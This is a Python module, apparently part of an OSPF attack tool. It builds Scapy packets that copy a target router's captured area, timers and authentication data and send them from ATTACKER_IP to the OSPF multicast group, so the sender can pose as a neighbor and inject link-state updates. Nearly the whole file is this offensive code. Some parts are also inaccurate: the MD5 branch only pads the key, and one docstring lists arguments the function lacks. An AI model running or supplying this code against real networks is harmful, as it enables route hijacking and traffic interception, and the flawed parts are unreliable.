"""
OSPF Packet Builders - RFC 2328 compliant with dynamic parameter injection.
Constructs Hello, DBD, LSR, LSU, LSAck packets with proper headers.
All packets use neighbor_params extracted from target router's Hello packet.
"""

from scapy.all import  Packet, Raw
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether

from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_DBDesc, OSPF_LSReq, OSPF_LSUpd, OSPF_LSA_Hdr
import struct
import time
from config import *

# ============================================================================
# OSPF Header Builder - Base for all OSPF packets
# ============================================================================

from scapy.fields import RawVal

def build_ospf_header(msg_type: int, neighbor_params: dict) -> Packet:
    """
    Build OSPF header with dynamic parameters from neighbor
    
    Args:
        msg_type: OSPF message type (1=Hello, 2=DBD, 3=LSR, 4=LSU, 5=LSAck)
        neighbor_params: Dictionary of extracted neighbor parameters
    
    Returns:
        Scapy OSPF_Hdr packet
    """
    area_id = neighbor_params.get('area_id', '0.0.0.0')
    auth_type = neighbor_params.get('auth_type', 0)
    auth_key = neighbor_params.get('auth_key', 0)
    router_id = neighbor_params.get('router_id', '192.168.1.1')
    
    # Handle authentication data based on Scapy's field type
    # authdata is typically a 64-bit integer or RawVal for bytes
    if auth_type == 0:
        # Null authentication - use integer 0 or RawVal of 8 zero bytes
        authdata = RawVal(b'\x00' * 8)
    elif auth_type == 1:
        # Simple password authentication
        if isinstance(auth_key, bytes):
            authdata = RawVal(auth_key.ljust(8, b'\x00')[:8])
        elif isinstance(auth_key, str):
            authdata = RawVal(auth_key.encode().ljust(8, b'\x00')[:8])
        elif isinstance(auth_key, int):
            authdata = RawVal(b'\x00' * 8)
        else:
            authdata = RawVal(b'\x00' * 8)
    elif auth_type == 2:
        # Cryptographic authentication (MD5)
        if isinstance(auth_key, bytes):
            authdata = RawVal(auth_key.ljust(8, b'\x00')[:8])
        elif isinstance(auth_key, str):
            authdata = RawVal(auth_key.encode().ljust(8, b'\x00')[:8])
        elif isinstance(auth_key, int):
            authdata = RawVal(b'\x00' * 8)
        else:
            authdata = RawVal(b'\x00' * 8)
    else:
        authdata = RawVal(b'\x00' * 8)
    
    ospf_hdr = OSPF_Hdr(
        version=2,
        type=msg_type,
        src=router_id,
        area=area_id,
        authtype=auth_type,
        authdata=authdata
    )
    
    return ospf_hdr


# ============================================================================
# Hello Packet Builder
# ============================================================================

def build_hello_packet(neighbor_params: dict, neighbors: list = None) -> Packet: # type: ignore
    """
    Build OSPF Hello packet with dynamic parameters from target.
    
    Args:
        neighbor_params: Dictionary containing:
            - network_mask: Network mask (e.g., "255.255.255.0")
            - hello_interval: Hello interval in seconds (default 10)
            - dead_interval: Router dead interval in seconds (default 40)
            - priority: Router priority (0-255)
            - designated_router: DR IP (default "0.0.0.0")
            - backup_router: BDR IP (default "0.0.0.0")
            - options: OSPF options field (default 0x02 for E-bit)
            - (plus all fields required by build_ospf_header)
        neighbors: List of neighbor Router IDs to include
    
    Returns:
        Complete OSPF Hello packet
    """
    ospf_hdr = build_ospf_header(1, neighbor_params)
    
    network_mask = neighbor_params.get('network_mask', '255.255.255.0')
    hello_interval = neighbor_params.get('hello_interval', 10)
    dead_interval = neighbor_params.get('dead_interval', 40)
    priority = neighbor_params.get('priority', 1)
    designated_router = neighbor_params.get('designated_router', '0.0.0.0')
    backup_router = neighbor_params.get('backup_router', '0.0.0.0')
    options = neighbor_params.get('options', 0x02)
    
    neighbors = neighbors or []
    
    hello_pkt = OSPF_Hello(
        mask=network_mask,
        hellointerval=hello_interval,
        options=options,
        prio=priority,
        deadinterval=dead_interval,
        router=designated_router,
        backup=backup_router,
        neighbors=neighbors
    )
    
    return ospf_hdr / hello_pkt


# ============================================================================
# Database Description (DBD) Packet Builder
# ============================================================================

def build_dbd_packet(neighbor_params: dict, dd_sequence: int, flags: int = 0x07, 
                     lsa_headers: list = None) -> Packet: # type: ignore
    """
    Build OSPF Database Description packet.
    
    Args:
        neighbor_params: Same as build_hello_packet
        dd_sequence: DBD sequence number
        flags: DBD flags (I=0x04, M=0x02, MS=0x01)
               Default 0x07 = I+M+MS (initial master packet)
        lsa_headers: List of LSA headers to include (default empty)
    
    Returns:
        Complete OSPF DBD packet
    """
    ospf_hdr = build_ospf_header(2, neighbor_params)
    
    options = neighbor_params.get('options', 0x02)
    mtu = neighbor_params.get('interface_mtu', 1500)
    
    lsa_headers = lsa_headers or []
    
    dbd_pkt = OSPF_DBDesc(
        options=options,
        mtu=mtu,
        dbdescr=flags,
        ddseq=dd_sequence,
        lsaheaders=lsa_headers
    )
    
    return ospf_hdr / dbd_pkt


# ============================================================================
# Link State Request (LSR) Packet Builder
# ============================================================================

def build_lsr_packet(neighbor_params: dict, ls_requests: list) -> Packet:
    """
    Build OSPF Link State Request packet.
    
    Args:
        neighbor_params: Same as build_hello_packet
        ls_requests: List of tuples (ls_type, ls_id, advertising_router)
                     Example: [(1, "10.0.0.1", "1.1.1.1")]
    
    Returns:
        Complete OSPF LSR packet
    """
    ospf_hdr = build_ospf_header(3, neighbor_params)
    
    # Build LSR payload manually if needed
    # Scapy's OSPF_LSReq expects a list of OSPF_LSReq_Item objects
    requests = []
    for ls_type, ls_id, adv_router in ls_requests:
        req = OSPF_LSReq(
            type=ls_type,
            id=ls_id,
            adrouter=adv_router
        )
        requests.append(req)
    
    # Chain all requests
    lsr_pkt = ospf_hdr
    for req in requests:
        lsr_pkt = lsr_pkt / req
    
    return lsr_pkt


# ============================================================================
# Link State Update (LSU) Packet Builder
# ============================================================================

def build_lsu_packet(neighbor_params: dict, lsas: list) -> Packet:
    """
    Build OSPF Link State Update packet.
    
    Args:
        neighbor_params: Same as build_hello_packet
        lsas: List of complete LSA objects (from scapy.contrib.ospf)
    
    Returns:
        Complete OSPF LSU packet
    """
    ospf_hdr = build_ospf_header(4, neighbor_params)
    
    lsu_pkt = OSPF_LSUpd(
        lsacount=len(lsas),
        lsalist=lsas
    )
    
    return ospf_hdr / lsu_pkt


# ============================================================================
# Link State Acknowledgment (LSAck) Packet Builder
# ============================================================================

def build_lsack_packet(neighbor_params: dict, lsa_headers: list) -> Packet:
    """
    Build OSPF Link State Acknowledgment packet.
    
    Args:
        neighbor_params: Same as build_hello_packet
        lsa_headers: List of LSA headers to acknowledge
    
    Returns:
        Complete OSPF LSAck packet
    """
    ospf_hdr = build_ospf_header(5, neighbor_params)
    
    # Chain LSA headers
    lsack_pkt = ospf_hdr
    for lsa_hdr in lsa_headers:
        lsack_pkt = lsack_pkt / lsa_hdr
    
    return lsack_pkt


# ============================================================================
# IP Wrapper for OSPF Packets
# ============================================================================

def wrap_in_ip(ospf_packet: Packet) -> Packet:
    """
    Wrap OSPF packet in IP layer.
    
    Args:
        ospf_packet: OSPF packet (from any builder above)
        src_ip: Source IP address
        dst_ip: Destination IP (default AllSPFRouters multicast)
    
    Returns:
        Complete IP/OSPF packet ready to send
    """
    eth = Ether(dst="01:00:5e:00:00:05")
    ip = IP(
        src=ATTACKER_IP,
        dst=MULTICAST_OSPF,
        ttl=1,
        proto=89,
        tos=0xc0
    )
    
    return eth/ ip / ospf_packet


# ============================================================================
# Parameter Extraction from Captured Hello Packet
# ============================================================================

def extract_neighbor_params(hello_packet: Packet, our_router_id: str, our_ip: str) -> dict:
    """
    Extract OSPF parameters from a captured Hello packet.
    These parameters must be mirrored in all our outgoing packets.
    
    Args:
        hello_packet: Scapy packet containing OSPF Hello
        our_router_id: Our Router ID to use in responses
        our_ip: Our IP address
    
    Returns:
        Dictionary of parameters for use in all packet builders
    """
    if not hello_packet.haslayer(OSPF_Hello):
        raise ValueError("Packet does not contain OSPF Hello layer")
    
    ospf_hdr = hello_packet[OSPF_Hdr]
    ospf_hello = hello_packet[OSPF_Hello]
    
    params = {
        # From OSPF Header
        'area_id': ospf_hdr.area if hasattr(ospf_hdr, 'area') else '0.0.0.0',
        'auth_type': ospf_hdr.authtype if hasattr(ospf_hdr, 'authtype') else 0,
        'auth_key': ospf_hdr.authdata if hasattr(ospf_hdr, 'authdata') else b'\x00' * 8,
        
        # From Hello packet
        'network_mask': ospf_hello.mask if hasattr(ospf_hello, 'mask') else '255.255.255.0',
        'hello_interval': ospf_hello.hellointerval if hasattr(ospf_hello, 'hellointerval') else 10,
        'dead_interval': ospf_hello.deadinterval if hasattr(ospf_hello, 'deadinterval') else 40,
        'options': ospf_hello.options if hasattr(ospf_hello, 'options') else 0x02,
        'designated_router': ospf_hello.router if hasattr(ospf_hello, 'router') else '0.0.0.0',
        'backup_router': ospf_hello.backup if hasattr(ospf_hello, 'backup') else '0.0.0.0',
        
        # Our identity
        'router_id': our_router_id,
        'our_ip': our_ip,
        
        # Peer identity (for tracking)
        'peer_router_id': ospf_hdr.src if hasattr(ospf_hdr, 'src') else None,
        
        # Interface MTU (used in DBD)
        'interface_mtu': 1500,  # Default, can be refined later
        
        # Router priority (our value, can differ from peer)
        'priority': 1  # Default, adjust as needed
    }
    
    return params
